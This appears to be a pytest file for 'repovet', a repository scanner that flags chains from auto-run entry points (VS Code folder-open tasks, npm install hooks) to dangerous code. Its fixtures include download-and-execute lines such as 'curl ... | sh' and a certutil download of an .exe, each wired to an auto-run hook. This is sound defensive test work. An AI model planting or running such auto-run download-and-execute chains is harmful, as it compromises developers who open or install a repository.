"""Chains from auto-run entry points to dangerous code (engine/chains.py)."""

import json
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest

from helpers import materialize
from repovet.cli import EXIT_FINDINGS, EXIT_OK, main
from repovet.engine import chains
from repovet.engine.checks import BUILDERS
from repovet.engine.checks.base import BuildEnv, CheckError, Params
from repovet.engine.checks.regex import logical_lines

TASK = (
    '{"version": "2.0.0", "tasks": [{"label": "env", "command": "%s", '
    '"runOptions": {"runOn": "folderOpen"}}]}'
)


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("./scripts/setup.sh", [("file", "./scripts/setup.sh", ())]),
        ("sudo -E bash tools/x.sh --fast", [("file", "tools/x.sh", ())]),
        (
            "FOO=1 node .vscode/a.js && python3 -u b.py",
            [("file", ".vscode/a.js", ()), ("file", "b.py", ())],
        ),
        ('sh -c "./inner.sh"', [("file", "./inner.sh", ())]),
        ("pwsh -NoProfile -File scripts\\s.ps1", [("file", "scripts\\s.ps1", ())]),
        ("cmd /c tools\\run.bat", [("file", "tools\\run.bat", ())]),
        ("deno run main.ts", [("file", "main.ts", ())]),
        ("make -C build -j4 setup V=1", [("make", "build", ("setup",))]),
        ("npm run prepare:all", [("npm", "", ("prepare:all",))]),
        ("curl -s https://example.invalid/x | sh", [("file", "curl", ())]),
        ("echo hi; ls", [("file", "echo", ()), ("file", "ls", ())]),
    ],
)
def test_references(command: str, expected: list[tuple[str, str, tuple[str, ...]]]) -> None:
    assert list(chains.references(command)) == expected


def test_make_recipes_follow_prerequisites_and_default_target() -> None:
    text = (
        "VAR := x\n.PHONY: all\nall: build\n\t@echo all\n\nbuild: gen\n\t-./build.sh \\\n"
        "\t  --fast\ngen:\n\tpython gen.py\nother: ; ./other.sh\n"
    )
    assert chains._make_recipes(text, ()) == (
        "python gen.py",
        "./build.sh  \t  --fast",
        "echo all",
    )
    assert chains._make_recipes(text, ("other",)) == ("./other.sh",)
    assert chains._make_recipes(text, ("missing",)) == ()


def test_file_commands() -> None:
    js = 'const { exec } = require("child_process");\n// "./not.sh"\nexec("sh run.sh");\n'
    assert chains._file_commands("a.js", js) == ("child_process", "sh run.sh")
    shell = "#!/bin/sh\n# comment\n./a.sh \\\n  --x\n\n"
    assert chains._file_commands("s.sh", shell) == ("./a.sh    --x",)
    batch = "@echo off\nREM note\n:: note\ncall b.bat\n"
    assert chains._file_commands("s.bat", batch) == ("@echo off", "call b.bat")


def test_logical_lines_join_odd_backslashes_only() -> None:
    lines = ["a \\", "b", "c \\\\", "d \\"]
    assert list(logical_lines(lines)) == [(1, "a  b"), (3, "c \\\\"), (4, "d ")]


def _report(tmp_path: Path, files: Mapping[str, object], *args: str) -> tuple[int, dict[str, Any]]:
    repo = materialize(tmp_path / "repo", files)
    out = tmp_path / "report.json"
    code = main(["scan", str(repo), "--offline", "--format", "json", "-o", str(out), *args])
    data: dict[str, Any] = json.loads(out.read_text(encoding="utf-8"))
    return code, data


def test_chain_parts_are_marked_and_counted_once(tmp_path: Path) -> None:
    files = {
        ".vscode/tasks.json": TASK % "./scripts/setup.sh",
        "scripts/setup.sh": "#!/bin/sh\ncurl -s https://example.invalid/s | sh\n",
    }
    code, report = _report(tmp_path, files)
    assert code == EXIT_FINDINGS
    by_rule = {f["rule_id"]: f for f in report["findings"]}
    chain = by_rule["RC-AUTO-090"]
    assert chain["severity"] == "critical"
    assert chain["message"] == (
        "VS Code task runs on folder open and reaches download-and-execute (RC-DLX-001) "
        "after 2 steps: .vscode/tasks.json -> scripts/setup.sh"
    )
    assert [s["path"] for s in chain["chain"]["steps"]] == [
        ".vscode/tasks.json",
        "scripts/setup.sh",
    ]
    assert chain["chain"]["steps"][1]["line"] == 2
    assert chain["evidence"] == "curl -s https://example.invalid/s | sh"
    assert by_rule["RC-AUTO-020"]["in_chain"] == chain["chain"]["id"]
    assert by_rule["RC-DLX-001"]["in_chain"] == chain["chain"]["id"]
    summary = report["summary"]
    assert summary["part_of_chains"] == 2
    assert summary["by_severity"]["critical"] == 1
    assert summary["by_severity"]["high"] == 0 and summary["by_severity"]["medium"] == 0


def test_fail_on_counts_the_chain(tmp_path: Path) -> None:
    files = {
        "package.json": '{"name": "d", "scripts": {"postinstall": "sh setup.sh"}}',
        "setup.sh": "curl -s https://example.invalid/s | sh\n",
    }
    code, report = _report(tmp_path / "a", files, "--fail-on", "high")
    assert code == EXIT_FINDINGS
    chain = next(f for f in report["findings"] if f["rule_id"] == "RC-AUTO-090")
    assert chain["severity"] == "high"
    code, _ = _report(tmp_path / "b", files, "--fail-on", "critical")
    assert code == EXIT_OK


def test_one_chain_per_reached_file(tmp_path: Path) -> None:
    files = {
        "package.json": '{"name": "d", "scripts": {"preinstall": "node pre.js"}}',
        "pre.js": 'const { exec } = require("child_process");\nexec("sh a.sh");\nexec("b.bat");\n',
        "a.sh": "curl -s https://example.invalid/a | sh\n",
        "b.bat": "certutil -urlcache -f https://example.invalid/b.exe b.exe\n",
    }
    _, report = _report(tmp_path, files)
    found = [f for f in report["findings"] if f["rule_id"] == "RC-AUTO-090"]
    ends = sorted(f["chain"]["steps"][-1]["path"] for f in found)
    assert ends == ["a.sh", "b.bat"]
    assert len({f["chain"]["id"] for f in found}) == 2
    # The entry point's own finding belongs to one chain only.
    entry = [f for f in report["findings"] if f["rule_id"] == "RC-AUTO-001"]
    assert len(entry) == 1 and entry[0]["in_chain"] in {f["chain"]["id"] for f in found}


@pytest.mark.parametrize(
    ("change", "message"),
    [
        ({"entries": []}, "entries"),
        ({"entries": [{"kind": "x", "label": "l", "rules": []}]}, "unknown entry kind"),
        ({"entries": [{"kind": "npm_install", "label": " ", "rules": []}]}, "label"),
        ({"entries": [{"kind": "npm_install", "label": "l", "rules": "RC-AUTO-001"}]}, "rules"),
        ({"entries": [{"kind": "npm_install", "label": "l", "rules": [], "inline": 1}]}, "inline"),
        ({"entries": [{"kind": "npm_install"}]}, "needs 'kind'"),
        ({"max_hops": 3}, "at most 2"),
        ({"endpoint_areas": ["nowhere"]}, "unknown areas"),
    ],
)
def test_invalid_parameters(change: dict[str, object], message: str) -> None:
    spec: dict[str, object] = {
        "type": "chain",
        "entries": [{"kind": "npm_install", "label": "npm", "rules": ["RC-AUTO-001"]}],
        "endpoint_areas": ["download_exec"],
        "raise_tags": ["exec"],
        "recheck_areas": ["download_exec"],
        **change,
    }
    with pytest.raises(CheckError, match=message):
        BUILDERS["chain"](Params(spec), BuildEnv({}))
